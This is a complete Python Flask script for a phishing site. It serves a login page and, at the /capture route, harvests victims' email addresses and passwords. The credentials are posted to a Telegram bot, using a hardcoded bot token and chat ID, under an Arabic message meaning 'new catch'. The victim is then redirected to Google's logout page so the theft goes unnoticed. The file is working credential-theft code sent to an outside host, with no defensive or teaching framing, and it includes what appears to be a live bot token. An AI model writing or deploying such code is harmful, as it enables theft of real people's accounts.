import requests
from flask import Flask, render_template, request, redirect
app = Flask(__name__)

TOKEN = "8501788737:AAGT30o-tywPq3G7tr1bDPyq_8pnQahOL7o"
CHAT_ID = "8133357563"

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/capture', methods=['POST'])
def capture():
    email = request.form.get('email')
    password = request.form.get('password')
    text = f"🎯 صيد جديد:\n📧 الإيميل: {email}\n🔑 الباسورد: {password}"
    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": text})
    return redirect("https://accounts.google.com/Logout")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
